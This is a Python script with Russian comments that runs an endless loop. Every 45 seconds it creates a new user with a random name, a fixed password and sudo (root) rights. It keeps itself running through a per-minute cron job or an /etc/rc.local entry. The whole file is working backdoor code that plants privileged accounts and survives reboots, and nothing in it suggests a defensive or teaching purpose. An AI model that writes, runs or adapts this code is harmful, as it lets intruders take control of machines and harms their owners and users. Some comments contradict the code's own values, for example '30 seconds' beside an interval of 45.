#!/usr/bin/env python3
import os
import subprocess
import random
import string
import time
import getpass

# --- Конфигурация ---

USERNAME_PREFIX = "user_"  # Префикс для имен пользователей
USER_PASSWORD = "strong_password" # Заданный пароль 
USER_CREATION_INTERVAL = 45       # Интервал создания пользователей в секундах (30 секунд)
PERSISTENCE_METHOD = "cron"  # Метод persistence: "cron" или "rc.local"

# --- Функции ---

def create_user():
    """Создает нового пользователя со случайным именем и заданным паролем и правами root."""
    username = USERNAME_PREFIX + ''.join(random.choice(string.digits) for i in range(5))  # Более уникальное имя

    try:
        # 1. Создание пользователя
        subprocess.run(['useradd', username], check=True, capture_output=True)
        # 2. Установка пароля (используем chpasswd, т.к. это неинтерактивно)
        subprocess.run(['chpasswd'], input=f"{username}:{USER_PASSWORD}".encode(), check=True, capture_output=True)
        # 3. Добавление пользователя в группу sudo (делаем root)
        subprocess.run(['usermod', '-aG', 'sudo', username], check=True, capture_output=True)

        print(f"Пользователь '{username}' создан с паролем '{USER_PASSWORD}' и правами root.")


    except subprocess.CalledProcessError as e:
        print(f"Ошибка при создании пользователя: {e.stderr.decode()}")

def setup_persistence():
    """Настраивает persistence для автоматического запуска скрипта."""
    script_path = os.path.abspath(__file__) # Получаем абсолютный путь к скрипту

    if PERSISTENCE_METHOD == "cron":
        # Cron job
        cron_command = f'* * * * * {script_path}'  # Запуск каждую минуту (каждые 30 секунд невозможно в cron)
        try:
            # Получаем текущего пользователя
            current_user = getpass.getuser()
            # Используем crontab для текущего пользователя
            try:
              result = subprocess.run(['crontab', '-l'], capture_output=True, check=False)
              crontab_output = result.stdout.decode()
            except subprocess.CalledProcessError:
                crontab_output = "" # Если crontab не существует, считаем, что он пустой
            
            crontab_list = crontab_output.splitlines()
            
            if cron_command not in crontab_list: # Проверяем, что cron_command еще не добавлен
              crontab_list.append(cron_command)
              # Ensure the last line has a newline character
              crontab_content = "\n".join(crontab_list) + "\n" # Добавляем newline в конце
              subprocess.run(['crontab', '-'], input=crontab_content.encode(), check=True)
              print("Cron job настроен.")
            else:
                print("Cron job уже настроен.")

        except subprocess.CalledProcessError as e:
            if e.stderr:
                print(f"Ошибка при настройке cron: {e.stderr.decode()}")
            else:
                print(f"Ошибка при настройке cron: Команда crontab вернула ненулевой код возврата {e.returncode}, но не вернула вывод об ошибке.")
    elif PERSISTENCE_METHOD == "rc.local":
        # rc.local (менее надежный, может не работать в современных системах systemd)
        rc_local_path = "/etc/rc.local"
        if os.path.exists(rc_local_path):
            try:
                with open(rc_local_path, "r") as f:
                    rc_local_content = f.readlines()

                # Проверяем, что скрипт уже не добавлен
                script_line = f"python3 {script_path} &\n"
                if script_line not in rc_local_content:
                    # Добавляем запуск скрипта перед "exit 0"
                    rc_local_content.insert(-1, script_line)

                    with open(rc_local_path, "w") as f:
                        f.writelines(rc_local_content)

                    # Делаем rc.local исполняемым
                    subprocess.run(['sudo', 'chmod', '+x', rc_local_path], check=True)
                    print("rc.local настроен.")
                else:
                    print("rc.local уже настроен.")

            except (FileNotFoundError, subprocess.CalledProcessError) as e:
                print(f"Ошибка при настройке rc.local: {e}")
        else:
            print("rc.local не найден.  Этот метод persistence не поддерживается вашей системой.")
    else:
        print("Неверный метод persistence. Используйте 'cron' или 'rc.local'.")

# --- Основной цикл ---

if __name__ == "__main__":
    # Настраиваем persistence при первом запуске
    setup_persistence()

    while True:
        create_user()
        time.sleep(USER_CREATION_INTERVAL)              